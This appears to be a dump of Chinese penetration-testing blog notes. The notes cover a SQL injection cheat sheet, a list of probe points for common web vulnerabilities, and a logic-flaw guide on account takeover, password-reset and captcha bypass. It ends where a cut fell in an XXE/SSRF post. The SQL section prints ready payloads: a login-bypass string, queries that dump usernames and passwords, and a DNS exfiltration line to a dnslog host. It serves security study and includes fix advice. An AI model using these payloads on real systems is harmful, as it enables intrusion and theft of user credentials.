Access\n\n\n基于反馈类型分类注入流程\n\n\n\n方式\n选择条件\n\n\n\nunion联合查询\n有显示位\n\n\n报错注入\nmysql_error调试未删除，控制报错信息\n\n\nbool盲注\n页面没显示位、不报错，只能通过页面是否正常来判断，通常为登录页面\n\n\n时间延时盲注\n页面没显示位、不报错，页面都显示正常，只能通过页面响应时间判断\n\n\n万能密码\nadmin&#x27; or 1=&#x27;1\n\n语境\nselect * from name = &#x27;admin&#x27; or 1=&#x27;1&#x27; and pass=&#x27;&#x27;;\n\n关键：\n使用or进行逻辑判断，构造true语句，使得整个判断语句为true\n三、手工注入流程1、判断换是否有注入漏洞，识别注入点类型\n2、获取数据库中的信息\n 获取数据库基本信息（数据库版本、数据库类型、查询列数等）\n 获取数据库库名\n 获取表名\n 获取列名\n 获取用户数据\n3、破解加密数据（数据解密）\n4、提升权限（配合其他漏洞）\n5、内网渗透（配合其他漏洞）\n四、详细过程union联合查询1、判断是否存在注入漏洞（需要结合数据情景，判断可能使用的sql语句）\n找与数据库交互的位置，判断动态参数，需要结合burpsuite抓包\n1、参数后加 &#39; &quot; \\（全加），判断页面是否异常（\\必出异常，不用做后续判断）\n2、若出现异常，则依次尝试修改判断字符，使页面返回正常。返回正常则为字符型注入。\n&gt;&gt;若均未返回正常页面，则尝试2-1(若原数据为1)判断是否为整数型注入。（正常则为整数型注入）\n3、使用使页面报错的字符，后加#（url中需url编码为%23）；若正常则只有该截断字符，不正常继续判断其他截断字符。\n&gt;&gt;再加)#；正常则含有括号，不正常则进行嵌套判断。\n4、以上均没有，则判断特殊注入。二次编码注入、宽字节注入、时间延时盲注等（这些类型注入，使用单双信号页面无变化）。\n2、判断数据库列数order by + 数字\n报错则用二分法继续判断，直至正常。精确到正常的临界数字，即为列数。\n&#39; order by 5#\n修改2为-2，使默认查询语句结果为空，隐去；这样union select结果即可显示。\n然后使用union select联合查,寻找显示位：\nid = -2 union select 1,2,3,4；\n3、数据库信息查询\n\n\n操作\n语句\n\n\n\n查库名\n-1 union select 1,2,database()-- a 推荐 -1 union select 1,2,(select group_concat(0x7e,(schema_name),0x7e) from information_schema.schemata)– a\n\n\n查表名\n-1 union select 1,2,(select group_concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema=&#39;数据库名&#39;)-- a\n\n\n查列名\n-1 union select 1,2,(select group_concat(0x7e,(column_name),0x7e) from information_schema.columns where table_schema=&#39;数据库名&#39; and table_name=&#39;表名&#39;)-- a\n\n\n查数据\n-1 union select 1,2,(select concat(0x7e,(uname,0x7e,pwd),0x7e) from dede_cms.dede_tb)-- a\n\n\n注意：\n1、union select查询列数要与前面列数相同\n2、concat()拼接多列结果，group_concat()拼接多行结果。\n如\nSELECT * FROM db_bbs.tb_user UNION SELECT 1,(SELECT group_concat(table_name,&#x27;|&#x27;)FROM information_schema.`TABLES` WHERE TABLES_schema=&#x27;db_bbs&#x27;;),3,4;\n\n3、可将查询内容去掉引号，转成16进制形式（前面加上0x）\n4、查表时，建议使用database()，既能避免转义，还可以确定当前有效数据库\n即\nSELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()\n\n\n\n数据库常用函数\n\n\n\n函数\n说明\n\n\n\nversion()\n数据库版本号\n\n\ndatabase()\n当前数据库\n\n\nuser()\n当前用户\n\n\ncurrent_user()\n当前用户名\n\n\nsystem_user()\n系统用户名\n\n\n@@datadir\n数据库路径\n\n\n@@version_compile_os\n操作系统版本\n\n\n\n\n\n常用函数\n说明\n\n\n\nlimit\n限制查询数量，下标从0开始 limit 0,1 从0开始查两个\n\n\nlength()\n计算数据长度\n\n\ncount()\n计算数据行数\n\n\nmid(str,1,30)\n截取字符串，从1开始截取30位,紧跟要截取的部分，即数据库名、表名、字段名和数据名\n\n\nsubstr(str,0,30)\n0为截取初始位，包含整个查询语句\n\n\nascii()\n转为ascii码\n\n\n报错注入1、相关函数\n\n\n函数\n语句\n\n\n\nupdatexml(arg1,arg2,arg3) 查询符合条件的数据 XPATH路径报错\nand updatexml(1,concat(0x5e,(select user()),0x5e),1)  mysql5.1.5及以上版本，输出有32位长度限制 0x5e为^的16进制编码，用于绕过斜杠转义，下同\n\n\nextractvalue(arg1,arg2) 同上，两个参数 XPATH路径报错\nand extractvalue(1,concat(0x5e,(select user()),0x5e))  mysql5.1及以上版本,输出有32位长度限制\n\n\nfloor() 返回小于等于该值的最大整数（只返回整数部分） floor、count、group by函数冲突报错\nand (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)  mysql5.0及以上版本，user()可变，其他固定\n\n\nname_const(name,value) 产生一个结果集合列 列名重复报错\nand select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a  mysql5.0及以下\n\n\nexp() 以e为底的指数函数 整形溢出报错\nand exp(~(select * from (select user()) a))  mysql5.5.5及以上版本\n\n\n几何函数报错（不满足要求就会报错） geometrycollection() multipoint() polygon() multipolygon() linestring() multilinestring()\nand multipoint((select * from (select * from (select * from (select version())a)b)c))\n\n\n2、用法：将对应user()等地方替换为要执行的sql语句即可\n\n\n\n操作\n语句\n\n\n\n查数据库名\nid=1&#39; and updatexml(1,group_concat(0x7e,(select database()),0x7e),1)-- a 推荐 或 id=1&#39; and updatexml(1,group_concat(0x7e,(select mid(group_concat(schema_name),1,30) from information_schema.schemata),0x7e),1)-- a\n\n\n查表名\nid=1&#39; and updatexml(1,group_concat(0x7e,(select mid(group_concat(table_name),1,30) from information_schema.tables where table_schema=&#39;数据库&#39;),0x7e),1)-- a\n\n\n查列名\nid=1&#39; and updatexml(1,group_concat(0x7e,(select mid(group_concat(column_name),1,30) from information_schema.columns where table_schema=&#39;数据库名&#39; and table_name=&#39;表名&#39;),0x7e),1)-- a\n\n\n查数据\nid=1&#39; and updatexml(1,group_concat(0x7e,(select mid(concat(username,0x7e,password),1,30) from &#39;数据库名&#39;.&#39;表名&#39;),0x7e),1)-- a\n\n\nSQL盲注布尔盲注条件匹配时返回数据，不匹配时无显示。需要对数据进行猜解（用ascii码进行匹配）\n1、用法：\nascii码二分法\n\n\n\n说明\n语句\n\n\n\n先判断数据长度或个数\nand length((select database())) &gt; 64\n\n\n然后进行二分法匹配\nand ascii(mid((select database()),1,1)) &gt;64\n\n\n2、语句（省略二分法，直接用=号）\nn均为前一句获取的长度值\n\n\n\n操作\n语句\n\n\n\n获取数据库长度\nand (length(database()))=8 注意：判断长度不需要转ascii码\n\n\n获取数据库名\nand ascii((select mid(database(),1,1)))=115 -- a\n\n\n获取表长度\nand length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=30 -- a\n\n\n获取表名\nand ascii((select mid(group_conca(table_name),1,1) from information_schema.tables where table_schema=database()))=100 -- a\n\n\n获取列长度\nand length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30 -- a\n\n\n获取列名\nand ascii((select mid(group_concat(column_name),1,1) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30 -- a\n\n\n获取数据长度\nand length((select group_concat(username) from database().&#39;表名&#39;))=30 -- a\n\n\n获取数据\nand ascii((select mid(concat(username,0x7e,password),1,1) from database().&#39;表名&#39;))=30 -- a\n\n\n时间延时盲注（单双引号页面无变化）\n基于sql盲注，为升级版本\n使用’”%判断时，页面无任何变化，尝试判断是否存在时间盲注\n1、判断：\n&#39; &quot; \\\n&#39;and sleep(3) %23\n&#39; and sleep(3))%23\n…\n方法同判断截断字符\n2、用法：\n\n\n\n函数\n语句\n\n\n\nif\nselect if(arg1,arg2,arg3) arg1：判断条件 arg2：条件为真时执行的语句 arg3：条件为假时执行的语句  常用： and select if((length(database())&gt;5),sleep(5),1) –a\n\n\ncase when\nselect case when arg1 then arg2 else arg3 end; arg1：判断条件 arg2：条件为真时执行的语句arg3：条件为假时执行的语句  常用： and select case when ascci(mid(version(),1,1))&gt;64 then sleep(3) end – a\n\n\n3、语句如下（省略二分法，直接用=号）\n\n\n\n操作\n语句\n\n\n\n获取数据库长度\nand if((length(database()))=8),sleep(3),1)-- a 注意：判断长度不需要转ascii码\n\n\n获取数据库名\nand if((ascii((select mid(database(),1,1)))=115),sleep(3),1) -- a\n\n\n获取表长度\nand if((length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=30),sleep(3),1) -- a\n\n\n获取表名\nand if((ascii((select mid(group_concat(table_name),1,1) from information_schema.tables where table_schema=database()))=100),sleep(3),1) -- a\n\n\n获取列长度\nand if((length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30),sleep(3),1) -- a\n\n\n获取列名\nand if((ascii((select mid(goup_concat(column_name),1,1) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30),sleep(3),1) -- a\n\n\n获取数据长度\nand if((length((select group_concat(username) from database().&#39;表名&#39;))=30),sleep(3),1) -- a\n\n\n获取字段名\nand if((ascii((select mid(concat(username),1,1) from database().&#39;表名&#39;))=30),sleep(3),1) -- a\n\n\n注： sleep可用benchmark代替\nbenchmark(arg1,arg2)\narg1为执行次数，arg2为执行语句\n即执行多少次指定语句，返回执行事件，次数500万次起步，基于cpu质量，延时不稳定\nbenchmark(5000000,md5(123)) 执行500万次MD5加密\nselect if(判断语句,benchmark(5000000,md5(123)),1)\n五、其他注入类型1、请求头注入\n\n\n类型\n说明\n\n\n\nUser-Agent\n浏览器版本\n\n\nX-Forwarded-For\n获取HTTP请求端的真实IP\n\n\n使用Header Editor工具修改请求头，在上述两个值后添加单双引号，保持开启状态即可\n注意，这里的sql语句大概率为insert，所以可用注入为：\n报错注入和bool盲注\n2、内联注入留言板界面若是存在注入，可用补齐insert语句参数法，\n找到留言板的显示位，在显示位上进行sql注入。\n这里难点在于插入位数未知、插入类型限制未知，所以位数需要逐个尝试，内容留空。\n使用\n不用注释，用截断代替，然后使用多个and/or连接\n注：前面为true用and；前面为false用or\n1、&#39;firefox&#39; and &#39;补齐\n2、&#39;firefox&#39; and payload and &#39;\n3、宽字节注入（单双引号页面无变化）\nmysql语句执行时，现将数据转成16进制，再执行\nGBK为两字节编码方式，编码范围为8140-FEFE（81为页数，40位行列）\nascii为单字节编码，编码范围为00-7F（斜杠的ascii码为5C）\n当字节数小于81时，会被认为是ascii编码，将转码成ascii码形式；\n当字节数在81-FE之间时，会被认为是gbk编码，会连同后一位一起以gbk形式编码。\n形如abcd（ab为ascii转码的数据，cd为gbk转码的数据）\n原本应解码成两个ascii数据（a、b）和一个gbk数据（cd）\n但是若b的数据大于81，则会被认为是gbk编码的数据，会和c一起解码，\n此时就解码成了两个ascii数据（a、d）和一个gbk编码数据（bc）\n用法：\n注意：通常出现在斜杠转义单双引号的网页\n利用：构造?id=1%df’即可\n%df可以为任何hex码在81-FE之间的数据\n宽字节注入存在条件\nPHP+Mysql+GBK\n编码语句：\nmysql_set_charset(&quot;gbk&quot;)mysql_query(&quot;set names gbk&quot;)\n\n转义语句：\naddslashes(&#x27;&#x27;)mysql_real_escape_string(&#x27;&#x27;)\n\n上述四条语句组合中，除了\nmysql_set_charset(&quot;gbk&quot;)+mysql_real_escape_string(&#39;&#39;)组合，其他组合均存在宽字节注入\n4、二次编码注入(单双引号页面无变化)\n注！先转义再解码造成注入，应先解码再转义\n\n\n\n正确流程\n错误流程（二次编码注入）\n\n\n\nphp自动进行一次url解码 网站二次解码 转义单双引号进行防护 写入数据库\nphp自动解码 转义防护 网站二次解码 urldecode()、rawurldecode() 写入数据库\n\n\n单引号二次url编码为：%2527\n双引号二次url编码为：%2522\n关键字二次编码：hex转码-前缀加%25（%的url编码）\n5、堆叠注入前提：存在sql注入\n截断符后使用分号分割，后面注释，中间插入任意sql语句（多个语句用;分割）\n堆叠注入存在场景\n\n\n\n搭配\n说明\n\n\n\nmssql+asp/php/jsp\n堆叠注入\n\n\nmysql+php\n\n\n\nmysql_connect()/mysql_query(“select $id”)\n不能堆叠注入\n\n\nmysqli_connect()/mysqli_query(“select $id”)\n不能堆叠注入\n\n\nmysqli_connect()/multi_query(“select $id”)\n堆叠注入\n\n\nnew PDO()/bindvalue(“select ?”) execute($id)\n不能注入\n\n\nnew PDO()/query(“select $id”)\n堆叠注入\n\n\n6、二阶注入存储在数据库汇总的数据，在使用时发生的注入\n在注册用户或者发表文章等写入数据库操作时，加入注入语句，被转义存入数据库\n当使用该数据时，被取出，这时注入语句生效\n注意：遇到限制是数字类型或者关键字拦截，可进行十六进制编码\n7、其他：文件上传时，可通过文件名进行sql注入\n六、DNS外带前提：\nWindows服务器，secure_file_priv为空（非NULL）\n语句：\nselect load_file(concat(&quot;\\\\\\\\&quot;,version(),&quot;.1ndex.dnslog.cn\\\\x&quot;));\n\n七、sql注入防护/修复\n\n\n修复\n说明\n\n\n\n去掉单引号\n现实场景常用单引号，去掉不合实际\n\n\n转义单引号\n对数字型无效（数字型不需要引号） 斜杠转义 addslashes()函数转义 php.ini配置文件转义（5.6以下版本开启magic_quotes_gpc = On）\n\n\n强制类型转换\n针对数字型 intval()\n\n\n更改数据库连接方式\nPOD连接数据库将变量转换成字符串，再写入数据库，无法拼接\n\n\n文件读写\n\n\n\n读写\n语句\n\n\n\n读文件\nload_file(‘’)\n\n\n写文件\ninto  outfile  多行写入，使用单引号，自动添加换行  into  dumpfile  单行写入，不转义\n\n\n","categories":["Web渗透"],"tags":["mysql"]},{"title":"TOP10漏洞探测点","url":"/article/TOP10%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B%E7%82%B9/","content":"\n\n\n漏洞\n探测点\n探测顺序\n\n\n\nSQL注入\n1、GET（url）变量处 2、POST包data变量处、header变量处\n1、单双引号探测 注入方式选择（– a） 数据库类型探测 防护规则探测 注入 2、时间延时盲注探测（msyql-mssql-oracle） 3、二次编码探测4、宽字节注入探测\n\n\n文件上传\n1、后台、编辑器等文件上传处\n1、黑白名单探测 2、拦截类型探测（后缀、类型、内容） 3、后缀名绕过 4、解析漏洞 5、其他类型（htaccess、.user.ini、00截断）\n\n\n文件包含\n1、GET、POST包调用本地或远程文件处\n1、本地文件读取 后缀绕过、伪协议读取（file://、php://filter） 2、远程文件读取后缀绕过python响应包伪造\n\n\n命令执行\n1、执行系统命令处\n1、连接字符挨个尝试\n\n\nXSS\n1、所有文本框输入处（留言板）\n1、闭合符判断是否存在xss 2、判断标签位置，是否要闭合标签 3、构造payload（&lt;&gt;、伪协议、事件、远程加载） 4、绕过\n\n\nCSRF\n1、进入后台后修改设置信息处 （公网IP） 注：可同时检查越权漏洞（登录、修改信息）\n1、GET请求、form表单 2、ajax跨域请求3、JSONP跨域、CORS跨域\n\n\nXXE\n1、xml格式的POST数据包处\n1、判断是否有显示位 有：直接执行数据 无：数据外带\n\n\nSSRF\n1、涉及网址调用处理的地方\n1、文件读取（直接读取、伪协议读取等，参考文件包含） 2、内网IP探测（http） 3、内网端口探测（dict://、gopher://）\n\n\n逻辑漏洞\n1、登录界面 2、含有数据发送处（修改等）\n1、登录爆破（验证码绕过、清除token信息、短信轰炸等） 2、修改用户信息（用户名、手机号、邮箱等具体账户信息；操作步骤等逻辑信息） 3、修改数据信息（多为uid等短数字，唯一标识用户身份，类似数据库的id；或者其他有意义的数字型参数，金额等）\n\n\n","categories":["Web渗透"],"tags":["思路"]},{"title":"逻辑漏洞","url":"/article/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","content":"一、漏洞的产生常见漏洞：\n身份认证安全漏洞、支付逻辑漏洞（数据纂改）\n任意密码找回漏洞、验证码突破漏洞\n接口调用安全、未授权访问漏洞\n二、权限绕过漏洞\n\n\n说明\n方法\n\n\n\n身份认证安全： 有些网站对身份认证模块没有做好安全防护，导致漏洞产生\n绕过身份认证有以下几种方法 1、暴力破解、撞库 2、Cookie&amp;session类（重要）加密 3、暴力破解 ：测试方法：在没有验证码限制或者一次验证码可以多次使用的地方，可以分为以下几种情况： 爆破用户名。&#9;当输入的用户名不存在时，会显示请输入正确用户名，或者用户名不存在 已知用户名。 &#9;比如： 已知用户名为admin，密码可以进行字典爆破 使用一个常用密码。&#9;比如123456对大量用户进行爆破  修复方法： 1、增加验证码。登录失败的时候，变换验证码。(验证码不能被工具识别) 2、限制登录频率。例如，5分钟内登录失败次数超过10次则锁定账号1小时。 3、二次验证。可以添加手机验证码或邮箱验证码。\n\n\nCookie伪造： 通过修改Cookie中的某个参数来实现登录其他用户\n测试方法： 1.使用一个账号登录，找一个可以证明身份的页面，例如首页的欢迎xxx或者是个人中心显示昵称的地方 2.刷新该页面拦截请求，观察Cookie中的字段和值，例如userid=xxx，修改Cookie中的值，把xxx改成admin 3.forword放行，页面显示admin的信息，则存在此问题。  修复方法： 对于客户端标识的用户信息，使用Session会话认证方式，避免通过Cookie去仿冒其他人的身份。\n\n\nSession会话固定攻击： 一种诱骗受害者使用攻击者指定的会话标识（Sessionid）的攻击手段，利用了服务器的session不变的机制\n攻击步骤： 1、攻击者通过某种手段重置目标用户的Sessionid，然后监听用户会话状态 2、目标用户携带攻击者设定的Sessionid登录站点 3、攻击者通过Sessionid获得合法会话  攻击者重置Sessionid的方法： 通过xss，嗅探等方法取得用户的session，修改数据包。 修复方法： 每次登陆成功之后重新生成session，sessionID闲置过久时，进行重置sessionID\n\n\n加密测试\n概念： 有些网站在前端加密，然后传到后台直接和数据库里的值做对比，这时抓包就知道加密方式，然后做暴力破解。  测试方法： 1、用账号密码登录，拦截请求，查看传输信息是不是通过一些加密方式对账号和密码进行了加密，如果有则存在此问题 2、对于前端加密后的密码进行暴力破解测试时，可以在BurpSuite的Intruder模块 PayloadProcessing中选择加密方式  修复方法： 把加密对比的方法放到后台去执行\n\n\n三、数据篡改数据纂改分为两方面：\n1、业务一致性安全：手机号篡改、邮箱和用户名篡改、订单ID更改、商品编号更改、用户ID篡改\n2、业务数据安全：金额数据篡改、商品数量篡改、最大数量限制突破、本地JS参数修改\n\n\n\n方法\n说明\n\n\n\n手机号篡改\n步骤： 抓包修改手机号码，之后进行越权判断，进入其他人的页面进行操作  修复： 通过session机制判断身份，还需校验手机号与登录者身份是否一致\n\n\n邮箱和用户名纂改\n步骤： 抓包修改用户名和邮箱为其他用户或邮箱  修复： 通过session机制判断身份，如需传输邮件，要判断发件人与session一致\n\n\n订单ID纂改\n步骤： 注册一普通账号，修改遍历订单ID，获取其他用户订单详情（平行越权）  修复： 查看订单是通过session判断用户身份，做好平行权限控制\n\n\n商品编号纂改\n步骤： 提交订单时，抓包修改商品标号，导致商品与价格不符却交易成功 举例： 例如100个积分只能换商品编号为001,1000个积分只能换商品编号005，在100积分换商品的时候抓包把换商品的编号修改为005，用低积分换取高积分商品。  修复： 金额不在客户端传入，防止被篡改，如必要，则务必检查交易金额与商品价格或对支付金额做签名校验\n\n\n用户ID纂改\n步骤：抓包查看用户的ID，修改ID（加减1），查看是否能查看其它用户id信息。 修复：通过session机制判断身份，如果必须用userID参数，要判断与session是否一致\n\n\n金额数据纂改\n步骤： 在提交订单时进行抓包，修改支付的金额或折扣等相关数据。  修复： 商品信息如金额、折扣等原始数据校验应来自于服务器端，不应接受客户端传来的值\n\n\n商品数量纂改\n步骤： 抓包修改商品数量等字段，将请求中的商品数量修改为负数或0，查看能否以修改后的数量完成业务流程。  修复： 产生异常的交易行为时直接限制、阻断\n\n\n本地JS参数纂改\n步骤： 部分应用程序通过Javascript处理用户提交的请求，通过修改Javascript脚本，测试修改后的数据是否影响到用户。  修复： 服务器校验；跨平台支付调用接口，要做好数据的完整性校验，确保一致性\n\n\n最大数限制突破\n步骤： 很多商品限制用户购买数量时，服务器仅在页面通过js脚本限制，没有在服务器端校验用户提交的数量，通过抓包修改商品最大数限制，将请求中的商品数量改为大于最大数限制的值，查看能否以修改后的数量完成业务流程。  修复： 每次提交都对其对应的各项信息做强校验\n\n\n四、业务授权安全越权漏洞的分类：\n\n\n\n说明\n\n\n\n\n水平越权 指相同权限的不同用户可以互相访问\n漏洞危害： 如果出现此漏洞，那么将可能会造成大批量数据泄露，严重的甚至会造成用户信息被恶意篡改。\n\n\n垂直越权 指使用权限低的用户可以访问权限较高的用户\n举例： 同一个公司不同权限的管理员A和B，通过修改请求，管理员A可以修改不在他管辖范围内的员工、考勤、工资等\n\n\n漏洞危害：\n向上越权：普通用户可以执行管理员权限，比如发布文章、删除文章等操作。\n向下越权：一个高级用户可以访问低级用户信息（暴露用户隐私）\n检测手段：\n查看所有敏感涉及到账户的操作是否有除了UID之外的验证方式，没有的话构造uid访问，可检查是否有漏洞，这里的uid代指username、email、userid等声称的账户信息\n如果有验证参数，尝试是否是可以预知的或者可以猜测出来的。不是，没有漏洞，是，有漏洞，构造请求验证漏洞\n发生越权行为的修复方法：\n1、涉及用户信息的操作需要验证用户身份，比如查看各种用户信息的情况下，不能只根据用户uid去搜索，应该再次进行身份验证\n2、特别敏感的操作应该进行二次操作\n五、任意密码找回的方法\n\n\n方法\n说明\n\n\n\n用户凭证暴力破解\n概念： 常见的是找回密码的验证码为4位，并且服务端没有加以限制，我们可以通过爆破出验证码的方式来找回密码 步骤： 验证码的位数：4or6，验证码有效时间：1min-15min 验证码爆破防护绕过  修复： 增加验证码复杂性和长度 限制请求修改次数\n\n\n返回凭证\n返回凭证的三种形式 1、url返回凭证 2、抓包返回凭证 3、凭证在页面中  方法： 1、URL返回凭证 使用firefox的firebug查看请求链接，看链接中是否有验证码等密码找回凭证 2、抓包直接返回 根据手机号找回密码后抓包，可以发现验证码直接显示verifycode=xxxx，如果信息被加密，解密即可（其他信息同理） 3、密码找回凭证在页面中 通过密保问题找回密码，查看源码，密保问题和答案就在源码中显示\n\n\n邮箱弱token\n获取邮箱弱token的方法： 1、Unix时间戳+md5 例如：通过邮箱找回密码，正常流程去邮箱查看重置密码链接，发现链接处有一串md5加密字符串。字符串解密，类似1491293277（10位），可以判断为Unix时间戳。 重置他人密码只需利用他人邮箱发送重置密码邮件，在短时间内对Unix时间戳进行暴力破解，即可获得重置密码的链接 2、用户名 例如：重置密码链接直接使用用户名进行区别，改变用户名即可更改他人密码 3、服务器时间 例如： 利用两个帐号同时点击找回密码，去邮箱查看找回密码的链接，发现两者的随机token只差1-2，而且可以猜测出为服务器时间。所以可以用一个未知帐号和一个已知帐号同时点击找回密码，稍微遍历随机token，就可以构造出未知帐号的密码找回链接\n\n\n用户凭证有效性\n通过用户凭证有效性修改密码： 1、短信验证码 通过他人手机号找回密码，抓包，将他人手机号替换成自己的手机号，获取验证码，提交后修改密码。 通过自己手机号找回密码，获取验证码后抓包，将数据包中的username改为他人用户名，提交后成功修改他人密码 2、邮箱token 通过邮箱找回密码，访问链接重置密码，输入新密码提交时抓包，虽然有token，但依然可以直接修改用户ID进而修改密码  案例：短信验证码 P2P之通融易贷存在设计缺陷可重置任意用户密码https://www.uedbox.com/post/19507/ 说明：点击修改密码时抓包，将邮箱号修改为自己的邮箱号，验证码就被发送到自己的邮箱中\n\n\n重新绑定手机和邮箱\n1、手机绑定： 给已知账户绑定手机，发现绑定手机的URL链接中有uid参数，修改uid参数为他人的，即可实现将他人的账户绑定上自己的手机，之后通过手机修改密码 修改个人资料处抓包，修改userId为他人，修改手机号为自己的手机，即可实现将他人的账户绑定上自己的手机，之后通过手机来修改密码  2、邮箱绑定： 通过邮箱找回密码，URL链接中修改用户ID为他人，邮箱不变，之后通过链接可以将他人账户绑定为自己的邮箱，之后通过邮箱找回密码\n\n\n服务器验证\n1、最终提交步骤 使用邮箱找回密码，通过链接至修改密码页面，修改密码后提交、抓包，获得Uid参数，修改为他人，即可修改其他用户密码 2、服务器验证的验证逻辑为空（绕过认证） 通过密码保护问题找回密码，抓包，将密码保护问题删除，直接修改密码，提交 注：此处密保问题和新密码在同一页面  案例：最终提交步骤 携程旅行网任意用户密码修改说明：通过修改密码邮件，进行密码修改，提交时进行抓包。将Uid改为别人的，即可修改其他人的密码\n\n\n修改凭证\n修改凭证找回密码的方法 1、修改手机号码 2、修改邮箱地址\n\n\n跳过验证\n跳过验证步骤、找回方式、直接到设置新密码页面 1、正常流程下，密码找回，查看最后设置新密码页面的URL，记录下来。继续返回密码找回处，输入其他用户名，提交找回申请，直接访问上面记录下的修改密码页面，成功修改密码 2、正常流程下，修改密码页面抓包，修改其中的USERNAME_COOKIE为其他用户（有可能会经过编码，比如base64），提交即可修改其他用户密码，如果抓包其中有step参数，可以修改这个参数为最后一步（比如：5），提交便可略过之前的步骤\n\n\n本地验证\n1、在本地验证服务器的返回信息，确定是否执行密码重置，但是其返回信息是可控的内容，或者是可以获得的内容 例如：通过手机找回密码，随便输入验证码，抓包，发送，拦截response包（Burpsuite中可以选取do intercept–&gt;response to this request），修改response包中的返回码，继续发送，说不定就可以绕过验证，直接跳到修改密码的页面。 2、发生短信等验证信息的动作在本地执行，可以通过修改request包进行控制 例如：通过用户名找回密码，提交后会自动发送验证码到手机中，抓包，修改手机为自己的手机（如果其中有type之类的参数，也可以尝试修改，有email之类的参数，可以尝试删除内容），发送修改后的包，手机成功接收验证码。输入验证码，继续发送，抓包，如果有type之类的参数，可以继续尝试修改，发送就可以成功修改密码\n\n\nToken生成可控\ntoken生成可控 举例： 1、通过邮箱找回密码，正常流程下，抓包查看提交验证码后返回的数据，有加密字符串，这个加密字符串和后面重新设置新密码URL链接中的加密字符串一样，所以可以利用这个加密字符串 2、根据上面提交验证码的抓包，修改User为其他用户（User有可能会使用md5加密），发送，就可以返回其他用户的加密字符串 3、重新返回到找回密码首页，利用其他用户找回，点下一步，到输入验证码处，直接修改URL链接，加入加密字符串，可以直接绕过验证码，重置密码\n\n\n注册覆盖\n注册覆盖 举例： 注册重复的用户名，例如admin，相当于修改了密码\n\n\nSession覆盖\nSession覆盖 举例： 同一浏览器，首先输入自己的账户进行邮箱密码找回，进入邮箱查看链接，接着输入他人账户，进行密码找回，返回刚刚自己的邮箱点击链接，由于session覆盖导致了，这个链接成为了修改他人密码的链接，成功修改他人密码\n\n\n六、验证码突破验证码突破方法\n\n\n\n方法\n说明\n\n\n\n暴力破解\n方法 1、有的验证码输入正确一次，在一定时间内不用再输入。 2、有的验证码输入正确一次，会在你session中设定一个值，告诉服务器你已经通过验证码验证了。 3、有的验证码因为逻辑问题只是一个摆设，正常的逻辑为先对比验证码是否正确，再检测账号密码是否正确，反过来了 4、删除cookie，将验证码参数va=1234变成va[]=1234  修复建议： 1、提高验证码的长度、复杂度 2、可限制错误登录次数、有效时间突破验证码的方法\n\n\n时间、次数突破\n概念： 重复提交携带验证码的数据包，查看返回包，判断次数 测试方法：填写正确登录信息和验证码–&gt;抓取提交数据包–&gt;重复提交该数据包–&gt;查看是否登录成功–&gt;登录成功则存在验证码重复使用问题  案例： Step1、输入正确信息点击登录时抓包 Step2、抓包，通过修改imageField参数的大小来实现暴力提交，自设一个两位数数字字典作为payloadStep3、查看任意响应包是否登录成功，从结果来看，暴力重复提交的数据包均登录成功。\n\n\n回显测试\n概念： 验证码直接由客户端生成，在回显中显示，可通过浏览器工具直接查看 测试方法： 1、在源码中显示。源代码审计，搜索源码中有无验证码 2、在COOKIE中显示。抓包时分析COOKIE中是否含有验证码 案例： Step1、输入相关信息 Step2、抓包，得到验证码 Step3、输入验证码。验证通过\n\n\n绕过测试\n漏洞成因：由于逻辑设计缺陷，可绕过验证，比如直接删除COOKIE或验证码参数可绕过、当验证不通过清空session时，验证码参数值为空时绕过等。 测试方法： 1、抓包，删除验证码字段，查看是否可以成功发送 2、抓包，正常流程下，记录验证码后的数据包，替换目标包中内容，直接发送，查看是否可以直接绕过验证码 案例： Step1、输入正确账户信息和错误验证码，登录时抓包 Step2、删除COOKIEStep3.客户端登陆成功\n\n\n七、接口调用安全\n\n\n方法\n说明\n\n\n\n重放攻击\n在短信、邮件调用业务或生成业务数据环节中（类：短信验证码，邮件验证码，订单生成，评论提交等），对其业务环节进行调用（重放）测试 常见类型： 短信轰炸（末尾空格、\\n绕过） 恶意注册  修复： 1、对评论提交等操作采用验证码机制，防止生成数据业务被恶意调用； 2、短信/邮件接口，需要对接调用频率进行控制或者上限限制； 3、每一个订单（接口访问）使用唯一的token，提交一次后，token失效\n\n\n内容编辑\n例如： 点击获取短信验证码，抓包，可以修改短信内容，实施下一步攻击  修复： 从客户端处获取手机号、邮箱等账号信息，要与Session中的凭证进行核验，验证通过后才允许进行业务操作。\n\n\n接口调用遍历漏洞\nWeb接口一般将常见的一些功能需求进行封装，通过传入不同的参数来获取对应的数据或者执行相应的功能，其中最常见的场景就是通过接口传入id参数，返回对应id的信息。此类接口如请求合法性校验不严，很容易出现非授权访问或者越权访问的问题。  修复： 1、在session中存储当前用户的凭证或者id，只有传入凭证或者id参数值与session中的一致才返回结果。 2、一般涉及身份校验的接口，不要直接将敏感信息的明文信息在客户端与服务端间传递，可以将敏感信息在服务端关联到用户标识ID，在客户端保存用户标识ID并提交到服务端，服务端根据ID取出对应信息后进行校验；\n\n\n接口未授权访问、调用漏洞\n在正常的业务中，敏感功能的接口需要对访问者的身份进行验证，验证通过后才允许调用接口进行操作。接口未做身份验证或身份校验不严，可能导致非授权访问或越权调用，越权又分为垂直越权和水平越权。  修复： 1、采用Token校验的方式，在url中添加一个Token参数，只有Token验证通过才返回接口数据且Token使用一次后失效； 2、在接口被调用时，服务器端对会话状态进行验证，如果已经登录，便返回接口数据；如未登录，则返回自定义的错误信息； 3、未授权访问接口做Session认证，并对用户访问的每一个URL做身份鉴别，正确的校验用户id及token等； 4、服务器端需校验身份唯一性，访问接口来源验证，不同身份只能查看修改删除添加自己的信息。\n\n\n","categories":["Web渗透"],"tags":["逻辑漏洞"]},{"title":"XXE和SSRF","url":"/article/XXE%E5%92%8CSSRF/","content":"XML是可拓展标识语言的简写；功能是传输数据，不是显示数据；\n\n\n\n说明\n语句\n\n\n\n数据格式\nContent-Type: application/xmlContent-Length: 9 